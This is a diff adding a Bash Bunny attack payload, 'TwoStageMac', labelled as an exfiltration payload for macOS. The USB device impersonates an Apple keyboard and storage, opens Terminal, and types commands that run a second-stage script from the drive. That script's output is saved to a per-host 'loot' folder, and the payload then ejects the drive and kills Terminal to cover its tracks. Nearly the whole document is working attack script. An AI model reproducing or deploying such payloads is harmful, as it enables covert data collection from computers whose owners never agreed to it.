@@ -1,0 +1,42 @@
+# Title:         TwoStageMac
+# Description:   A simple two stage payload for OSX. Sample second stage
+#                does some device profiling.
+# Author:        Draxiom
+# Props:         jdetmold
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        OSX
+# Attack Modes:  HID, STORAGE
+
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+GET SWITCH_POSITION
+
+# Global variables
+MOUNTING_LOCATION=/Volumes/BashBunny
+SECOND_STAGE=${MOUNTING_LOCATION}/payloads/${SWITCH_POSITION}/second-stage.sh
+LOOT_DIR=${MOUNTING_LOCATION}/loot/$\(hostname\)
+
+# Open terminal
+LED ATTACK
+RUN OSX terminal
+Q ENTER
+Q DELAY 200
+# Open new window in case there's already a terminal window open
+Q GUI n
+Q DELAY 100
+
+# Set up loot directory and pipe output to text file (named by epoch time)
+Q STRING NOW=$\(date +'%s'\)\; mkdir -p $LOOT_DIR/\$NOW\; sh $SECOND_STAGE ${LOOT_DIR}/\$NOW \> $LOOT_DIR/\$NOW/STDOUT.txt 2\> $LOOT_DIR/\$NOW/STDERR.txt
+Q ENTER
+
+# Eject
+LED CLEANUP
+Q STRING diskutil eject ${MOUNTING_LOCATION}
+Q ENTER
+Q STRING killall Terminal
+Q ENTER
+
+sync
+
+LED FINISH
